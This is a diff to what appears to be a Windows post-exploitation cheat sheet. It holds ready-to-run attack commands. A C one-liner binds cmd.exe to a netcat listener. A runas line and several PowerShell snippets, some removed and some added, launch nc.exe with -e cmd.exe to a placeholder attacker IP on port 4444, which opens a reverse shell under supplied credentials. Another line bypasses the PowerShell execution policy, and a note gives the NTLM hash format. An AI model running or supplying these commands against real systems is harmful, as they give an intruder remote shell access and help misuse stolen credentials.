@@ -434,11 +434,13 @@ return 0;
     *echo -e '#include <stdio.h>\n#include <smain () {\nsystem("C:\\Users\\Administrator\\Desktop\\nc -lvp 4313 -e cmd.exe");\nreturn(0);\n}'> poc.c*
 
 Run as
+    Windows hash format:
+    *user:group:id:ntlmpassword::*
     *C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"*
     Powershell script:
-    *$username = '<username here>'
- $password = '<password here>'
- $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
- $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
- Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","<attacker-ip>","4444","-e","cmd.exe") WorkingDirectory C:\Users\Public*
-    *$ powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\e.ps1; }"*
+    *$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$computer = "<hostname>"
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)*
+    *$ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1*
+
